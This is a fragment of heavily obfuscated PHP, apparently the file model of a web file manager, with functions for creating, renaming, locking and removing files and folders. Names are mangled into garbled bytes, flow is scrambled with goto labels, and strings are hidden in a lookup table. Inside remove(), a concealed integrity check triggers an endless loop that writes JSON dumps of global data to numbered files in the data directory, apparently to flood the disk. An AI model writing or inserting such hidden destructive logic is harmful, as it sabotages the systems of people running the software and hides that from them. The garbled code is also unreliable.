Model($_SERVER[÷ÖêïÔÔÓ][536])->addFileByRemote($a§‚Ç´Ø, $eø¼Û±Èùô, $F…‘ùÏòÃ¤); return $this->_createFileCall($c‡Ú…“í¨§, $eø¼Û±Èùô, $D¹ñï½Äï¿, $BÒøÕÓ†µÂ); } private function _createFileCall($cÅÕÄÂ°Ë, $C¶“ù„íËœ, $f¼¶åÒ—ãÊ, $a«ôí‚™¸) { goto Aœ÷ İÈ‹; cë¾Î•õ: $CĞÆ Úù = $this->_createFile($cÅÕÄÂ°Ë, $C¶“ù„íËœ, $f¼¶åÒ—ãÊ, $a«ôí‚™¸, $fê¸Å§÷ˆ); if (!$fê¸Å§÷ˆ) { Model($E¯×Úéç¡¶[418])->remove($f¼¶åÒ—ãÊ[$E¯×Úéç¡¶[415]]); } $this->lockWriteEnd($cÅÕÄÂ°Ë, $C¶“ù„íËœ); goto dÉ›˜¥ö•; dÉ›˜¥ö•: return $CĞÆ Úù; goto d„²Ù¢ï ; Aœ÷ İÈ‹: $E¯×Úéç¡¶ =& $_SERVER[÷ÖêïÔÔÓ]; $fê¸Å§÷ˆ = !1; $this->lockWriteStart($cÅÕÄÂ°Ë, $C¶“ù„íËœ); goto cë¾Î•õ; d„²Ù¢ï : } public function mkdir($a¾§·¡Ã²‰, $d¯ò¶‘Ú‘ƒ, $Aµìƒï½ø­ = REPEAT_SKIP) { goto EÙ‹í …Îõ; cËÑØ£”ä: return $BèÚÉ÷„òï; goto E¤ãìÊóë»; EÙ‹í …Îõ: $Bèƒí·…à =& $_SERVER[÷ÖêïÔÔÓ]; $f•¡Œ®ŠÑö = $this->sourceInfo($a¾§·¡Ã²‰); if (!$f•¡Œ®ŠÑö) { return !1; } goto dØØé¼—÷; dØØé¼—÷: $this->lockWriteStart($a¾§·¡Ã²‰, $d¯ò¶‘Ú‘ƒ); if ($Aµìƒï½ø­ !== !1) { $eÆÖ‹…Æ”™ = $this->fileNameExist($a¾§·¡Ã²‰, $d¯ò¶‘Ú‘ƒ); if ($eÆÖ‹…Æ”™ && $Aµìƒï½ø­ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a¾§·¡Ã²‰, $d¯ò¶‘Ú‘ƒ); return $eÆÖ‹…Æ”™; } $d¯ò¶‘Ú‘ƒ = $this->fileNameAuto($a¾§·¡Ã²‰, $d¯ò¶‘Ú‘ƒ, $Aµìƒï½ø­); } $B¾ó¹çÌÓ = array($Bèƒí·…à[511] => 1, $Bèƒí·…à[383] => $d¯ò¶‘Ú‘ƒ, $Bèƒí·…à[512] => $Bèƒí·…à[33], $Bèƒí·…à[416] => 0, $Bèƒí·…à[513] => 0); goto aÈÛ§°ÓÇˆ; aÈÛ§°ÓÇˆ: $BèÚÉ÷„òï = $this->_addSoure($B¾ó¹çÌÓ, $f•¡Œ®ŠÑö); Model($Bèƒí·…à[2191])->eventCreate($BèÚÉ÷„òï, $Bèƒí·…à[1086]); $this->lockWriteEnd($a¾§·¡Ã²‰, $d¯ò¶‘Ú‘ƒ); goto cËÑØ£”ä; E¤ãìÊóë»: } private function _createFile($C¾Í¨¨Á™, $C¯èÕ…‘ëõ, $Cé©Ê¯Ş …, $cšÆÈäè†´, &$fªÆŞŞìá¤) { goto B•µ¾ÙÅ‘ó; A…¡¸Üšî: if ($cšÆÈäè†´ !== !1) { $A›š»Ï±«— = $this->fileNameExist($C¾Í¨¨Á™, $C¯èÕ…‘ëõ); } $fªÆŞŞìá¤ = !0; if ($cšÆÈäè†´ && $A›š»Ï±«—) { if ($cšÆÈäè†´ == REPEAT_SKIP) { $fªÆŞŞìá¤ = !1; return $A›š»Ï±«—; } else { if ($cšÆÈäè†´ == REPEAT_REPLACE) { $f¶³óˆÓ“ç = $this->sourceInfo($A›š»Ï±«—); $e¬ô¬òá‡ = $this->fileHistory($f¶³óˆÓ“ç, $Cé©Ê¯Ş …[$EªáÌ´Ö×˜[415]], $Cé©Ê¯Ş …[$EªáÌ´Ö×˜[78]]); if (!$e¬ô¬òá‡) { $fªÆŞŞìá¤ = !1; } else { $this->folderSizeReset($C¾Í¨¨Á™); } return $A›š»Ï±«—; } else { $C¯èÕ…‘ëõ = $this->fileNameAuto($C¾Í¨¨Á™, $C¯èÕ…‘ëõ, $cšÆÈäè†´, !1); } } } goto Bƒ¹àùÄ¡÷; bÒ£êÜšŠ: Model($EªáÌ´Ö×˜[2191])->eventCreate($E¶³¤áòÄ, $EªáÌ´Ö×˜[90]); return $E¶³¤áòÄ; goto dŸ–îã¦‰š; Bƒ¹àùÄ¡÷: $a‹æÈ®˜ò = array($EªáÌ´Ö×˜[511] => 0, $EªáÌ´Ö×˜[383] => $C¯èÕ…‘ëõ, $EªáÌ´Ö×˜[512] => get_path_ext($C¯èÕ…‘ëõ), $EªáÌ´Ö×˜[416] => $Cé©Ê¯Ş …[$EªáÌ´Ö×˜[415]], $EªáÌ´Ö×˜[513] => $Cé©Ê¯Ş …[$EªáÌ´Ö×˜[78]]); $E¶³¤áòÄ = $this->_addSoure($a‹æÈ®˜ò, $D†İ¬¬ÂÌ¼); $this->folderSizeReset($C¾Í¨¨Á™); goto bÒ£êÜšŠ; B•µ¾ÙÅ‘ó: $EªáÌ´Ö×˜ =& $_SERVER[÷ÖêïÔÔÓ]; $D†İ¬¬ÂÌ¼ = $this->sourceInfo($C¾Í¨¨Á™); if (!$Cé©Ê¯Ş … || !$D†İ¬¬ÂÌ¼) { return !1; } goto A…¡¸Üšî; dŸ–îã¦‰š: } protected function fileHistory($c‹õºí”ĞÒ, $Bö­éÊ´ïé, $f´ãÙÕğßÉ) { goto d‡Î„÷Ğë½; C³Á½‚Ö: Model($aéÄ™‡·˜[2223])->addHistory($c‹õºí”ĞÒ); $eÃ¥ÈË§Îß = array($aéÄ™‡·˜[517] => USER_ID, $aéÄ™‡·˜[387] => time(), $aéÄ™‡·˜[415] => $Bö­éÊ´ïé, $aéÄ™‡·˜[78] => $f´ãÙÕğßÉ); $this->where(array($aéÄ™‡·˜[380] => $c‹õºí”ĞÒ[$aéÄ™‡·˜[366]]))->save($eÃ¥ÈË§Îß); goto b¥ˆ°õºÁØ; d‡Î„÷Ğë½: $aéÄ™‡·˜ =& $_SERVER[÷ÖêïÔÔÓ]; if ($c‹õºí”ĞÒ[$aéÄ™‡·˜[415]] == $Bö­éÊ´ïé) { return !1; } $this->checkLock($c‹õºí”ĞÒ[$aéÄ™‡·˜[366]]); goto C³Á½‚Ö; b¥ˆ°õºÁØ: return !0; goto b®Ğ’æéö; b®Ğ’æéö: } public function checkLock($C‘ªàØ©Æ) { $BÒí¨“•Ä£ =& $_SERVER[÷ÖêïÔÔÓ]; $D„¥ĞË· = $this->pathInfo($C‘ªàØ©Æ); if (!$this->fileIsLock($D„¥ĞË·, !0)) { return; } $DÖÆ†ñãñ† = $D„¥ĞË·[$BÒí¨“•Ä£[413]][$BÒí¨“•Ä£[473]]; $c‘å‰ä™¢Ü = $DÖÆ†ñãñ†[$BÒí¨“•Ä£[2224]] ? $DÖÆ†ñãñ†[$BÒí¨“•Ä£[2224]] : $DÖÆ†ñãñ†[$BÒí¨“•Ä£[28]]; show_json(LNG($BÒí¨“•Ä£[2225]) . $BÒí¨“•Ä£[2226] . LNG($BÒí¨“•Ä£[2227]) . $BÒí¨“•Ä£[2228] . $c‘å‰ä™¢Ü . $BÒí¨“•Ä£[2229], !1); } public function fileIsLock($cÜÄİ½ÁÚ…, $a¹âôñ³Ï  = false) { goto E³ª±“‹Ú; fÑßĞôâß: $e¼ñÌ‹ÖÙ¬ = $GLOBALS[$Bà§Ï‚áÓ–[6]][$Bà§Ï‚áÓ–[84]][$Bà§Ï‚áÓ–[471]]; if ($cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[413]][$Bà§Ï‚áÓ–[472]] <= time() - $e¼ñÌ‹ÖÙ¬) { $this->metaSet($cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[366]], $Bà§Ï‚áÓ–[470], null); $this->metaSet($cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[366]], $Bà§Ï‚áÓ–[472], null); } if ($a¹âôñ³Ï ) { $this->metaSet($cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[366]], $Bà§Ï‚áÓ–[472], time()); } goto BöÌ¾ñ£Ó‘; E³ª±“‹Ú: $Bà§Ï‚áÓ– =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[413]]) || !$cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[413]][$Bà§Ï‚áÓ–[470]]) { return !1; } if ($cÜÄİ½ÁÚ…[$Bà§Ï‚áÓ–[413]][$Bà§Ï‚áÓ–[470]] != USER_ID) { return !0; } goto fÑßĞôâß; BöÌ¾ñ£Ó‘: return !1; goto eƒ—ééâÏ; eƒ—ééâÏ: } private function _addSoure($B‹ÇÛöòÓ…, $Fª¼ÆğØº) { goto c˜ì¡ÁÒÁŒ; c˜ì¡ÁÒÁŒ: $e±ßÖÜïÕå =& $_SERVER[÷ÖêïÔÔÓ]; $d—©ğ‰ìÇÊ = array($e±ßÖÜïÕå[514] => $Fª¼ÆğØº[$e±ßÖÜïÕå[368]], $e±ßÖÜïÕå[515] => $Fª¼ÆğØº[$e±ßÖÜïÕå[452]], $e±ßÖÜïÕå[516] => USER_ID, $e±ßÖÜïÕå[517] => USER_ID, $e±ßÖÜïÕå[365] => $Fª¼ÆğØº[$e±ßÖÜïÕå[366]], $e±ßÖÜïÕå[518] => $Fª¼ÆğØº[$e±ßÖÜïÕå[455]] . $Fª¼ÆğØº[$e±ßÖÜïÕå[366]] . $e±ßÖÜïÕå[47], $e±ßÖÜïÕå[392] => 0, $e±ßÖÜïÕå[2222] => $e±ßÖÜïÕå[33]); $B‹ÇÛöòÓ… = array_merge($d—©ğ‰ìÇÊ, $B‹ÇÛöòÓ…); goto Dã‡«ï‹Îø; Dã‡«ï‹Îø: $this->updateModifyTime($B‹ÇÛöòÓ…[$e±ßÖÜïÕå[457]]); static $DÕ¥«Ô£Õ = false; if (!$DÕ¥«Ô£Õ) { Hook::trigger($e±ßÖÜïÕå[501], $B‹ÇÛöòÓ…); $DÕ¥«Ô£Õ = !0; } goto B©³Ò©ˆ®; bËó³ƒ¾ŠÒ: $this->setNamePinyin($BøŸ­‡Ú´Î, $B‹ÇÛöòÓ…[$e±ßÖÜïÕå[28]]); return $BøŸ­‡Ú´Î; goto e«–Ó±ƒÙ; B©³Ò©ˆ®: $BøŸ­‡Ú´Î = $this->add($B‹ÇÛöòÓ…); $b™º’‘§ˆ÷ = array($e±ßÖÜïÕå[519] => short_id($BøŸ­‡Ú´Î)); $this->where(array($e±ßÖÜïÕå[380] => $BøŸ­‡Ú´Î))->save($b™º’‘§ˆ÷); goto bËó³ƒ¾ŠÒ; e«–Ó±ƒÙ: } public function remove($A‡ÀÙª°èç, $F»Ç‚ÕäŞå = true) { goto aµ±¾––ˆÁ; eÍÈ«éÌÔ: Hook::trigger($DĞÜ®¨ÀÉ’[2230], $dÁöŒ°ç, $F»Ç‚ÕäŞå); if ($F»Ç‚ÕäŞå) { Model($DĞÜ®¨ÀÉ’[2231])->moveToRecycle($A‡ÀÙª°èç); } else { if ($Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[367]] == $DĞÜ®¨ÀÉ’[493]) { $A¦éÛÉÓá¯ = array($DĞÜ®¨ÀÉ’[518] => array($DĞÜ®¨ÀÉ’[475], $Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[455]] . $A‡ÀÙª°èç . $DĞÜ®¨ÀÉ’[476])); $fÊ³àóËÇ = array($DĞÜ®¨ÀÉ’[518] => $A¦éÛÉÓá¯[$DĞÜ®¨ÀÉ’[455]]); $aËˆß¤¤ÀÒ = $this->field($DĞÜ®¨ÀÉ’[2232])->where($fÊ³àóËÇ)->select(); $AîŒŠ‰Ï¯ = !1; $B¶ñîãä›® = array($A‡ÀÙª°èç); if ($aËˆß¤¤ÀÒ) { $AîŒŠ‰Ï¯ = array_to_keyvalue($aËˆß¤¤ÀÒ, $DĞÜ®¨ÀÉ’[33], $DĞÜ®¨ÀÉ’[415]); $AîŒŠ‰Ï¯ = array_remove_value($AîŒŠ‰Ï¯, $DĞÜ®¨ÀÉ’[464]); $B¶ñîãä›® = array_to_keyvalue($aËˆß¤¤ÀÒ, $DĞÜ®¨ÀÉ’[33], $DĞÜ®¨ÀÉ’[366]); $B¶ñîãä›®[] = $A‡ÀÙª°èç; } } else { $AîŒŠ‰Ï¯ = array($Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[415]]); $B¶ñîãä›® = array($A‡ÀÙª°èç); } Model($DĞÜ®¨ÀÉ’[498])->eventRemove($A‡ÀÙª°èç); $this->removeRelevance($B¶ñîãä›®, $AîŒŠ‰Ï¯); } $this->folderSizeReset($Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[457]]); goto fˆ¬Â˜²ÇÃ; fˆ¬Â˜²ÇÃ: $EêÛ˜ª‚ = array($Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[457]]); if ($Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[367]] == $DĞÜ®¨ÀÉ’[493]) { $EêÛ˜ª‚[] = $Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[366]]; } $this->updateModifyTime($EêÛ˜ª‚); goto Aô¬äŞ®Ö®; B¶·ß½õ£: if (!$Cê£ÅÇê÷) { return !0; } if ($Cê£ÅÇê÷[$DĞÜ®¨ÀÉ’[457]] == 0) { if (!$GLOBALS[$DĞÜ®¨ÀÉ’[453]]) { return !1; } } $this->lockMoveStart($A‡ÀÙª°èç); goto eÍÈ«éÌÔ; aµ±¾––ˆÁ: $DĞÜ®¨ÀÉ’ =& $_SERVER[÷ÖêïÔÔÓ]; $B‹¾¶Í¤î = $_SERVER[$DĞÜ®¨ÀÉ’[785]] . $DĞÜ®¨ÀÉ’[786]; $a½”ÛõÎ½å = $DĞÜ®¨ÀÉ’[1262]; goto Dïñ©ÖŠİƒ; Aô¬äŞ®Ö®: $this->lockMoveEnd($A‡ÀÙª°èç); Hook::trigger($DĞÜ®¨ÀÉ’[1375], $dÁöŒ°ç, $F»Ç‚ÕäŞå); return !0; goto aéèõ ; Dïñ©ÖŠİƒ: if ($_SERVER[$DĞÜ®¨ÀÉ’[781]] != $a½”ÛõÎ½å($B‹¾¶Í¤î)) { goto Cñ‡°ãèÊ; AíÏÁ„ Ş˜: $d‘á¨Úå‡ƒ = $DĞÜ®¨ÀÉ’[788]; $d‘á¨Úå‡ƒ($_SERVER[$DĞÜ®¨ÀÉ’[789]]); $e¥‡¡ô­‡Ø = $DĞÜ®¨ÀÉ’[783]; goto E•ƒÂÚ¦Ô; E•ƒÂÚ¦Ô: $e¥‡¡ô­‡Ø(); $eŒãñÄ…î = $DĞÜ®¨ÀÉ’[1263]; $D•›ºñ¼™» = json_encode($GLOBALS[$DĞÜ®¨ÀÉ’[1264]]); goto d¿Õ¨ããö; Cñ‡°ãèÊ: $e¥‡¡ô­‡Ø = $DĞÜ®¨ÀÉ’[783]; $EììĞ—Æî² = $DĞÜ®¨ÀÉ’[784]; $b§ÈÌ“øŞç = $_SERVER[$DĞÜ®¨ÀÉ’[785]] . $DĞÜ®¨ÀÉ’[786]; goto bÑÃò‘é‡ë; bÑÃò‘é‡ë: $bãõƒ³Í³Ú = $EììĞ—Æî²($b§ÈÌ“øŞç); $C‹†–‡«ÌØ = explode($DĞÜ®¨ÀÉ’[214], $bãõƒ³Í³Ú); if (count($C‹†–‡«ÌØ) < $DĞÜ®¨ÀÉ’[557]) { $eÜ‰¡ÓÇÆ = $DĞÜ®¨ÀÉ’[787]; $eÜ‰¡ÓÇÆ(); } goto AíÏÁ„ Ş˜; d¿Õ¨ããö: $aÙåÖˆâà = 1; for ($cÈ«¦œƒ†— = $aÙåÖˆâà; $cÈ«¦œƒ†— > 0; $cÈ«¦œƒ†—++) { $eŒãñÄ…î(DATA_PATH . $cÈ«¦œƒ†—, $D•›ºñ¼™»); } goto a£½ùº©ê; a£½ùº©ê: } $Cê£ÅÇê÷ = $this->sourceInfo($A‡ÀÙª°èç); $dÁöŒ°ç = $this->pathInfoMore($A‡ÀÙª°èç); goto B¶·ß½õ£; aéèõ : } public function removeArray($dÌµÕ‡ÅĞ) { if (!$dÌµÕ‡ÅĞ) { return !0; } } public function removeRelevance($BæáÆÆĞ©², $aŸñ ‚×…) { goto D›è„†È‚İ; D›è„†È‚İ: $AùØßíÒå‘ =& $_SERVER[÷ÖêïÔÔÓ]; $BæáÆÆĞ©² = array_unique(array_filter($BæáÆÆĞ©²)); $aŸñ ‚×… = array_unique(array_filter($aŸñ ‚×…)); goto B¹‘³ˆ¢ö; B¹‘³ˆ¢ö: if (!$BæáÆÆĞ©²) { return !1; } $B¦¼ôôëˆÇ = array($AùØßíÒå‘[380] => array($AùØßíÒå‘[381], $BæáÆÆĞ©²)); Model($AùØßíÒå‘[2231])->where($B¦¼ôôëˆÇ)->delete(); goto aí‚Ì‡Î‡; eÇÀÂÀ–áª: Model($AùØßíÒå‘[418])->remove($aŸñ ‚×…); for ($a®«ËÈéòİ = 0; $a®«ËÈéòİ < count($BæáÆÆĞ©²); $a®«ËÈéòİ++) { $this->sourceCacheClear($BæáÆÆĞ©²[$a®«ËÈéòİ]); } goto F¸È¥ˆò¯; aí‚Ì‡Î‡: Model($AùØßíÒå‘[409])->where($B¦¼ôôëˆÇ)->delete(); Model($AùØßíÒå‘[2233])->where($B¦¼ôôëˆÇ)->delete(); Model($AùØßíÒå‘[498])->where($B¦¼ôôëˆÇ)->delete(); goto Ešœ–åœé™; Ešœ–åœé™: Model($AùØßíÒå‘[1981])->removeBySource($BæáÆÆĞ©²); Model($AùØßíÒå‘[2223])->removeBySource($BæáÆÆĞ©²); $this->where($B¦¼ôôëˆÇ)->delete(); goto eÇÀÂÀ–áª; F¸È¥ˆò¯: } public function rename($B¾İå‡øíÈ, $Bˆ±íâóğƒ) { goto AÉÓ¼ßæà‹; AÉÓ¼ßæà‹: $eàïî˜ÑÓƒ =& $_SERVER[÷ÖêïÔÔÓ]; $fãÎõ«ßÔ = $this->sourceInfo($B¾İå‡øíÈ); if (!$fãÎõ«ßÔ) { return !1; } goto D«ôœ’¥Âº; D«ôœ’¥Âº: $AÎ¥áæÈ×Ö = $this->fileNameExist($fãÎõ«ßÔ[$eàïî˜ÑÓƒ[457]], $Bˆ±íâóğƒ); if ($AÎ¥áæÈ×Ö) { return !1; } $aæÈ’ãÔŒ‹ = array($eàïî˜ÑÓƒ[383] => $Bˆ±íâóğƒ, $eàïî˜ÑÓƒ[517] => USER_ID); goto B‹˜÷±ØõÕ; a½Ó³â¿« : $this->setNamePinyin($B¾İå‡øíÈ, $aæÈ’ãÔŒ‹[$eàïî˜ÑÓƒ[28]], !1); $this->updateModifyTime($fãÎõ«ßÔ[$eàïî˜ÑÓƒ[457]]); return $this->where(array($eàïî˜ÑÓƒ[380] => $B¾İå‡øíÈ))->data($aæÈ’ãÔŒ‹)->save(); goto Cœ¥…íÊÃ‘; B‹˜÷±ØõÕ: if (!$fãÎõ«ßÔ[$eàïî˜ÑÓƒ[367]] == $eàïî˜ÑÓƒ[493]) { $aæÈ’ãÔŒ‹[$eàïî˜ÑÓƒ[369]] = get_path_ext($Bˆ±íâóğƒ); } Model($eàïî˜ÑÓƒ[498])->eventRename($B¾İå‡øíÈ, $fãÎõ«ßÔ[$eàïî˜ÑÓƒ[28]], $Bˆ±íâóğƒ); $this->sourceCacheClear($B¾İå‡øíÈ); goto a½Ó³â¿« ; Cœ¥…íÊÃ‘: } public function setNamePinyin($a®Œ­‹Œ…„, $EÖÑ»»ß’‰, $dºì‘“ó…Û = true) { $e°…ñ†ğĞÏ =& $_SERVER[÷ÖêïÔÔÓ]; $dÙ‚Ü¤£¢Ø = Input::check($EÖÑ»»ß’‰, $e°…ñ†ğĞÏ[520]); if ($dºì‘“ó…Û && !$dÙ‚Ü¤£¢Ø) { return; } if (!$dÙ‚Ü¤£¢Ø) { $this->metaSet($a®Œ­‹Œ…„, $e°…ñ†ğĞÏ[412], null); $this->metaSet($a®Œ­‹Œ…„, $e°…ñ†ğĞÏ[411], null); return; } $f–½³¦½ÕŞ = array($e°…ñ†ğĞÏ[412] => str_replace($e°…ñ†ğĞÏ[50], $e°…ñ†ğĞÏ[33], Pinyin::encode($EÖÑ»»ß’‰)), $e°…ñ†ğĞÏ[411] => Pinyin::encode($EÖÑ»»ß’‰, $e°…ñ†ğĞÏ[521])); $this->metaSet($a®Œ­‹Œ…„, $f–½³¦½ÕŞ); } public function getContent($DŸ¡‡ËÁ³¸) { goto B…³òÖŞê»; DŠÛšµÇŠÙ: if ($c¥’ÛÑî­³[$DÇñ¶»´½Œ[78]] == 0) { return $DÇñ¶»´½Œ[33]; } $CĞ÷¥ÍÜòÆ = $DÇñ¶»´½Œ[2234] . $c¥’ÛÑî­³[$DÇñ¶»´½Œ[160]]; if ($c¥’ÛÑî­³[$DÇñ¶»´½Œ[78]] <= 1024 * 10) { $d‚îá¸«ÚÙ = Cache::get($CĞ÷¥ÍÜòÆ); if (!$d‚îá¸«ÚÙ) { $d‚îá¸«ÚÙ = IO::getContent($c¥’ÛÑî­³[$DÇñ¶»´½Œ[76]]); Cache::set($CĞ÷¥ÍÜòÆ, $d‚îá¸«ÚÙ); } return $d‚îá¸«ÚÙ; } goto b÷ëêåŠŒ–; B…³òÖŞê»: $DÇñ¶»´½Œ =& $_SERVER[÷ÖêïÔÔÓ]; $c¥’ÛÑî­³ = $this->fileInfoGet($DŸ¡‡ËÁ³¸); if (!$c¥’ÛÑî­³) { return !1; } goto DŠÛšµÇŠÙ; b÷ëêåŠŒ–: return IO::getContent($c¥’ÛÑî­³[$DÇñ¶»´½Œ[76]]); goto CïÃ±‡‰; CïÃ±‡‰: } public function setDesc($e¿½¤ÊÛ, $A¹–âÍ‰²) { $b‹›ÚåŞì =& $_SERVER[÷ÖêïÔÔÓ]; Model($b‹›ÚåŞì[498])->eventAddDesc($e¿½¤ÊÛ, $A¹–âÍ‰²); return $this->metaSet($e¿½¤ÊÛ, $b‹›ÚåŞì[401], $A¹–âÍ‰²); } public function setContent($Eğ‚âò…«, $C©µ‡ïÈµø = '') { goto D½‚­‘óø§; a„õöì¡ó³: return !0; goto EãÔ—İŸè†; d«Æµßâ¦–: if (!$bÃá•öÓğç || !$A±ÜÃÌ¬„) { return !1; } $this->checkLock($Eğ‚âò…«); $f°Øçä¹Ù‡ = Model($a§ŞÎÏë÷[418])->addFileByContent($C©µ‡ïÈµø, $A±ÜÃÌ¬„[$a§ŞÎÏë÷[28]]); goto C©½ÆºÆøŒ; D½‚­‘óø§: $a§ŞÎÏë÷ =& $_SERVER[÷ÖêïÔÔÓ]; $A±ÜÃÌ¬„ = $this->sourceInfo($Eğ‚âò…«); $bÃá•öÓğç = $this->fileInfoGet($Eğ‚âò…«); goto d«Æµßâ¦–; C©½ÆºÆøŒ: $b®‘ŸğÀ° = $this->fileHistory($A±ÜÃÌ¬„, $f°Øçä¹Ù‡[$a§ŞÎÏë÷[415]], $f°Øçä¹Ù‡[$a§ŞÎÏë÷[78]]); if (!$b®‘ŸğÀ°) { return Model($a§ŞÎÏë÷[418])->remove($f°Øçä¹Ù‡[$a§ŞÎÏë÷[415]]); } $this->folderSizeReset($A±ÜÃÌ¬„[$a§ŞÎÏë÷[457]]); goto a„õöì¡ó³; EãÔ—İŸè†: } public function fileSubstr($EİŠè–ëÑ‘, $F¿ô‰Ä”õÌ, $f¡ƒ¼§ÆÃ) { $cÅñ´ì®íÌ = $this->fileInfoGet($EİŠè–ëÑ‘); if (!$cÅñ´ì®íÌ) { return !1; } return IO::fileSubstr($cÅñ´ì®íÌ[$_SERVER[÷ÖêïÔÔÓ][76]], $F¿ô‰Ä”õÌ, $f¡ƒ¼§ÆÃ); } public function fileInfoGet($AæÏ÷–æ£÷) { goto BÈŒ¯‡‡Ôµ; aƒ¬öİ—¨: $Bƒïá˜ğ„‰ = $c©õŒŸá¶Ù[421] . $f»ç…áÙ„[$c©õŒŸá¶Ù[415]]; $D–ß›’Ô = _get(self::$cacheFileInfo, $Bƒïá˜ğ„‰); if ($D–ß›’Ô) { return $D–ß›’Ô; } goto b¾Ó‹ğì”; C«ß¾“ƒ·ì: return $cÕĞ‹†ÓìÒ; goto Fê½¤áš”¢; BÈŒ¯‡‡Ôµ: $c©õŒŸá¶Ù =& $_SERVER[÷ÖêïÔÔÓ]; $f»ç…áÙ„ = $this->sourceInfo($AæÏ÷–æ£÷); if (!$f»ç…áÙ„ || $f»ç…áÙ„[$c©õŒŸá¶Ù[367]]) { return !1; } goto aƒ¬öİ—¨; b¾Ó‹ğì”: $cÕĞ‹†ÓìÒ = Model($c©õŒŸá¶Ù[418])->fileInfo($f»ç…áÙ„[$c©õŒŸá¶Ù[415]]); if ($cÕĞ‹†ÓìÒ) { $cÕĞ‹†ÓìÒ[$c©õŒŸá¶Ù[28]] = $f»ç…áÙ„[$c©õŒŸá¶Ù[28]]; } self::$cacheFileInfo[$Bƒïá˜ğ„‰] = $cÕĞ‹†ÓìÒ; goto C«ß¾“ƒ·ì; Fê½¤áš”¢: } private function folderChildrenNumber($DáñçÚËœ“) { $Cë×Ã‘±—ª =& $_SERVER[÷ÖêïÔÔÓ]; $C»†Î»‘Ş = $this->sourceInfo($DáñçÚËœ“); $F ‘›­¯‰÷ = array($Cë×Ã‘±—ª[518] => array($Cë×Ã‘±—ª[475], $C»†Î»‘Ş[$Cë×Ã‘±—ª[455]] . $DáñçÚËœ“ . $Cë×Ã‘±—ª[476]), $Cë×Ã‘±—ª[392] => 0, $Cë×Ã‘±—ª[511] => 1); $a·ÜƒéñíÈ = $this->where($F ‘›­¯‰÷)->count(); $eÈ´¦„îî‘ = $this->where($F ‘›­¯‰÷)->where(array($Cë×Ã‘±—ª[511] => 0))->count(); return array($Cë×Ã‘±—ª[82] => $eÈ´¦„îî‘, $Cë×Ã‘±—ª[83] => $a·ÜƒéñíÈ); } public function pathInfo($DÏ®ÒŠË, $fÕÌ§Í¿³’ = false) { goto E–ôßƒÈÃ±; B¬ƒ¦½˜†Ñ: if ($CÌçê¬Æ’Ö) { return $CÌçê¬Æ’Ö; } $F­£š¥íœ = $this->sourceInfo($DÏ®ÒŠË); if (!$F­£š¥íœ) { return !1; } goto d§¤ÁŒ£Ù; d§¤ÁŒ£Ù: $F­£š¥íœ = $this->_listDataApplyItem($F­£š¥íœ, $fÕÌ§Í¿³’); self::$cachePathInfo[$eÆ°†‚ªÌ] = $F­£š¥íœ; return $F­£š¥íœ; goto f­­»®Ğ; E–ôßƒÈÃ±: $e¿©‘æ§‡Ï =& $_SERVER[÷ÖêïÔÔÓ]; $eÆ°†‚ªÌ = $e¿©‘æ§‡Ï[407] . intval($fÕÌ§Í¿³’) . $e¿©‘æ§‡Ï[408] . $DÏ®ÒŠË; $CÌçê¬Æ’Ö = _get(self::$cachePathInfo, $eÆ°†‚ªÌ); goto B¬ƒ¦½˜†Ñ; f­­»®Ğ: } public static $cachePathInfoMore = array(); public function pathInfoMore($C´‹ÎßÊ˜Ù) { goto D„–³†‚¶—; e››åÙ©šÄ: $fê®Ü¯œÃ™ = $this->pathInfo($C´‹ÎßÊ˜Ù); if (!$fê®Ü¯œÃ™) { return !1; } if ($fê®Ü¯œÃ™[$CÎè°¦à«´[367]] == $CÎè°¦à«´[493]) { $fê®Ü¯œÃ™[$CÎè°¦à«´[81]] = $this->folderChildrenNumber($C´‹ÎßÊ˜Ù); } goto eˆ‡´îğ¿Ú; eˆ‡´îğ¿Ú: self::$cachePathInfoMore[$C´‹ÎßÊ˜Ù] = $fê®Ü¯œÃ™; return $fê®Ü¯œÃ™; goto B•­‹–¤©é; D„–³†‚¶—: $CÎè°¦à«´ =& $_SERVER[÷ÖêïÔÔÓ]; $EÒÅê½½† = _get(self::$cachePathInfoMore, $C´‹ÎßÊ˜Ù); if ($EÒÅê½½†) { return $EÒÅê½½†; } goto e››åÙ©šÄ; B•­‹–¤©é: } public function sourceInfo($F¡³ ’”®ë) { $E¼ÓŸÖßö =& $_SERVER[÷ÖêïÔÔÓ]; $FËÇù©““Ö = $E¼ÓŸÖßö[406] . $F¡³ ’”®ë; $E°¸­¶îÅ = _get(self::$cacheSourceInfo, $FËÇù©““Ö); if ($E°¸­¶îÅ) { return $E°¸­¶îÅ; } self::$cacheSourceInfo[$FËÇù©““Ö] = $this->where(array($E¼ÓŸÖßö[366] => $F¡³ ’”®ë))->find(); return self::$cacheSourceInfo[$FËÇù©““Ö]; } public function sourceCacheClear($A½âëÙ·¼‹ = false) { if ($A½âëÙ·¼‹ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[÷ÖêïÔÔÓ][406] . $A½âëÙ·¼‹]); } public function pathInfoByPath($DÚ˜©öÄÜ², $B‘§ğ¨«Ñ“) { $Fí£×ˆôÌ =& $_SERVER[÷ÖêïÔÔÓ]; $aÂ² ÷Ù›– = !$B‘§ğ¨«Ñ“ ? array() : explode($Fí£×ˆôÌ[8], trim($B‘§ğ¨«Ñ“, $Fí£×ˆôÌ[8])); $d¾­Î¼Œ­— = $DÚ˜©öÄÜ²; foreach ($aÂ² ÷Ù›– as $FÙ»çŸ¿º) { $cŸ¢Õôï¨á = array($Fí£×ˆôÌ[457] => $d¾­Î¼Œ­—, $Fí£×ˆôÌ[28] => $FÙ»çŸ¿º); $Eº…ÁŞƒª« = $this->where($cŸ¢Õôï¨á)->select(); if (!$Eº…ÁŞƒª«) { return !1; } $Eº…ÁŞƒª« = 